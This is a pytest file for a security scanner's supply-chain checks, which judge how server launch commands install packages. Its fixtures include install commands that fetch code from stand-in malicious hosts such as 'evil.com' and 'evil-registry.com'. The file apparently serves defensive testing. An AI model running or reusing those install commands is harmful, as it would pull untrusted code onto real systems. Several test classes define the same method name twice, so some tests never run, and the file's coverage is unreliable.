"""Unit tests for Supply Chain checks.

Covers SC-001 (Untrusted Package Sources).

Each check is tested for:
- Metadata loads correctly
- FAIL on vulnerable configurations
- PASS on secure configurations
- Edge cases and skip behaviour
"""

from __future__ import annotations

import pytest

from medusa.checks.supply_chain.sc001_untrusted_package_sources import UntrustedPackageSourcesCheck
from medusa.checks.supply_chain.sc002_dependency_vulnerability import DependencyVulnerabilityCheck
from medusa.checks.supply_chain.sc003_abandoned_dependencies import AbandonedDependenciesCheck
from medusa.checks.supply_chain.sc004_excessive_dependencies import ExcessiveDependenciesCheck
from medusa.checks.supply_chain.sc005_unpinned_transitive_deps import UnpinnedTransitiveDepsCheck
from medusa.checks.supply_chain.sc006_install_scripts_present import InstallScriptsPresentCheck
from medusa.checks.supply_chain.sc007_native_binary_dependencies import (
    NativeBinaryDependenciesCheck,
)
from medusa.checks.supply_chain.sc008_single_maintainer_risk import SingleMaintainerRiskCheck
from medusa.core.models import Severity, Status
from tests.conftest import make_snapshot

# ==========================================================================
# SC-001: Untrusted Package Sources
# ==========================================================================


class TestSc001UntrustedPackageSources:
    """Tests for UntrustedPackageSourcesCheck."""

    @pytest.fixture()
    def check(self) -> UntrustedPackageSourcesCheck:
        return UntrustedPackageSourcesCheck()

    async def test_metadata_loads_correctly(self, check: UntrustedPackageSourcesCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc001"
        assert meta.category == "supply_chain"
        assert meta.severity == Severity.HIGH

    async def test_fails_on_custom_registry(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry", "https://evil-registry.com"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
        assert "evil-registry.com" in fail_findings[0].status_extended

    async def test_fails_on_custom_registry_equals_syntax(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry=https://malicious.io/npm"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_official_npm_registry(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry", "https://registry.npmjs.org"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_fails_on_pip_install_from_url(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="pip",
            args=["install", "https://evil.com/malicious-1.0.tar.gz"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
        assert "evil.com" in fail_findings[0].status_extended

    async def test_passes_on_pip_install_package_name(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="pip",
            args=["install", "requests==2.31.0"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_fails_on_npm_install_git_no_hash(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "git+https://github.com/user/repo"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
        assert "commit hash" in fail_findings[0].status_extended.lower()

    async def test_passes_on_npm_install_git_with_hash(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "git+https://github.com/user/repo#abc1234567890"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        # Should pass since it has a commit hash pin
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_skips_http_transport(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry", "https://evil.com"],
            transport_type="http",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_skips_non_package_manager(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["server.js"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_passes_on_clean_npm_install(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "express"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS


class TestDependencyVulnerabilityCheck:
    """Tests for DependencyVulnerabilityCheck."""

    @pytest.fixture()
    def check(self) -> DependencyVulnerabilityCheck:
        return DependencyVulnerabilityCheck()

    async def test_metadata_loads_correctly(self, check: DependencyVulnerabilityCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc002"
        assert meta.category == "supply_chain"

    async def test_fails_on_missing_config_key(self, check: DependencyVulnerabilityCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: DependencyVulnerabilityCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "logging": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_fails_on_missing_config_key(self, check: DependencyVulnerabilityCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: DependencyVulnerabilityCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "audit": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_no_config_fails(self, check: DependencyVulnerabilityCheck) -> None:
        snapshot = make_snapshot(config_raw=None)
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1


class TestAbandonedDependenciesCheck:
    """Tests for AbandonedDependenciesCheck."""

    @pytest.fixture()
    def check(self) -> AbandonedDependenciesCheck:
        return AbandonedDependenciesCheck()

    async def test_metadata_loads_correctly(self, check: AbandonedDependenciesCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc003"
        assert meta.category == "supply_chain"

    async def test_fails_on_missing_config_key(self, check: AbandonedDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: AbandonedDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "logging": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_fails_on_missing_config_key(self, check: AbandonedDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: AbandonedDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "update": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_no_config_fails(self, check: AbandonedDependenciesCheck) -> None:
        snapshot = make_snapshot(config_raw=None)
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1


class TestExcessiveDependenciesCheck:
    """Tests for ExcessiveDependenciesCheck."""

    @pytest.fixture()
    def check(self) -> ExcessiveDependenciesCheck:
        return ExcessiveDependenciesCheck()

    async def test_metadata_loads_correctly(self, check: ExcessiveDependenciesCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc004"
        assert meta.category == "supply_chain"

    async def test_skips_non_stdio_transport(self, check: ExcessiveDependenciesCheck) -> None:
        snapshot = make_snapshot(transport_type="http")
        findings = await check.execute(snapshot)
        assert findings == []

    async def test_runs_on_stdio_transport(self, check: ExcessiveDependenciesCheck) -> None:
        snapshot = make_snapshot(
            transport_type="stdio",
            command="node",
            args=["server.js"],
        )
        findings = await check.execute(snapshot)
        assert len(findings) >= 1

    async def test_skips_non_stdio_transport(self, check: ExcessiveDependenciesCheck) -> None:
        snapshot = make_snapshot(transport_type="http")
        findings = await check.execute(snapshot)
        assert findings == []

    async def test_runs_on_stdio_transport(self, check: ExcessiveDependenciesCheck) -> None:
        snapshot = make_snapshot(
            transport_type="stdio",
            command="node",
            args=["server.js"],
        )
        findings = await check.execute(snapshot)
        assert len(findings) >= 1


class TestUnpinnedTransitiveDepsCheck:
    """Tests for UnpinnedTransitiveDepsCheck."""

    @pytest.fixture()
    def check(self) -> UnpinnedTransitiveDepsCheck:
        return UnpinnedTransitiveDepsCheck()

    async def test_metadata_loads_correctly(self, check: UnpinnedTransitiveDepsCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc005"
        assert meta.category == "supply_chain"

    async def test_skips_non_stdio_transport(self, check: UnpinnedTransitiveDepsCheck) -> None:
        snapshot = make_snapshot(transport_type="http")
        findings = await check.execute(snapshot)
        assert findings == []

    async def test_runs_on_stdio_transport(self, check: UnpinnedTransitiveDepsCheck) -> None:
        snapshot = make_snapshot(
            transport_type="stdio",
            command="node",
            args=["server.js"],
        )
        findings = await check.execute(snapshot)
        assert len(findings) >= 1

    async def test_executes_without_error(self, check: UnpinnedTransitiveDepsCheck) -> None:
        snapshot = make_snapshot(
            tools=[{"name": "t", "description": "A test tool"}],
            config_raw={"command": "node"},
        )
        findings = await check.execute(snapshot)
        assert isinstance(findings, list)

    async def test_empty_snapshot(self, check: UnpinnedTransitiveDepsCheck) -> None:
        snapshot = make_snapshot()
        findings = await check.execute(snapshot)
        assert isinstance(findings, list)


class TestInstallScriptsPresentCheck:
    """Tests for InstallScriptsPresentCheck."""

    @pytest.fixture()
    def check(self) -> InstallScriptsPresentCheck:
        return InstallScriptsPresentCheck()

    async def test_metadata_loads_correctly(self, check: InstallScriptsPresentCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc006"
        assert meta.category == "supply_chain"

    async def test_skips_non_stdio_transport(self, check: InstallScriptsPresentCheck) -> None:
        snapshot = make_snapshot(transport_type="http")
        findings = await check.execute(snapshot)
        assert findings == []

    async def test_runs_on_stdio_transport(self, check: InstallScriptsPresentCheck) -> None:
        snapshot = make_snapshot(
            transport_type="stdio",
            command="node",
            args=["server.js"],
        )
        findings = await check.execute(snapshot)
        assert len(findings) >= 1

    async def test_skips_non_stdio_transport(self, check: InstallScriptsPresentCheck) -> None:
        snapshot = make_snapshot(transport_type="http")
        findings = await check.execute(snapshot)
        assert findings == []

    async def test_runs_on_stdio_transport(self, check: InstallScriptsPresentCheck) -> None:
        snapshot = make_snapshot(
            transport_type="stdio",
            command="node",
            args=["server.js"],
        )
        findings = await check.execute(snapshot)
        assert len(findings) >= 1


class TestNativeBinaryDependenciesCheck:
    """Tests for NativeBinaryDependenciesCheck."""

    @pytest.fixture()
    def check(self) -> NativeBinaryDependenciesCheck:
        return NativeBinaryDependenciesCheck()

    async def test_metadata_loads_correctly(self, check: NativeBinaryDependenciesCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc007"
        assert meta.category == "supply_chain"

    async def test_fails_on_missing_config_key(self, check: NativeBinaryDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: NativeBinaryDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "logging": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_fails_on_missing_config_key(self, check: NativeBinaryDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: NativeBinaryDependenciesCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "native": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_no_config_fails(self, check: NativeBinaryDependenciesCheck) -> None:
        snapshot = make_snapshot(config_raw=None)
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1


class TestSingleMaintainerRiskCheck:
    """Tests for SingleMaintainerRiskCheck."""

    @pytest.fixture()
    def check(self) -> SingleMaintainerRiskCheck:
        return SingleMaintainerRiskCheck()

    async def test_metadata_loads_correctly(self, check: SingleMaintainerRiskCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc008"
        assert meta.category == "supply_chain"

    async def test_fails_on_missing_config_key(self, check: SingleMaintainerRiskCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: SingleMaintainerRiskCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "logging": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_fails_on_missing_config_key(self, check: SingleMaintainerRiskCheck) -> None:
        snapshot = make_snapshot(
            config_raw={"command": "node", "args": ["index.js"]},
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_config_key_present(self, check: SingleMaintainerRiskCheck) -> None:
        snapshot = make_snapshot(
            config_raw={
                "command": "node",
                "maintainer": {"enabled": True},
            },
        )
        findings = await check.execute(snapshot)
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_no_config_fails(self, check: SingleMaintainerRiskCheck) -> None:
        snapshot = make_snapshot(config_raw=None)
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
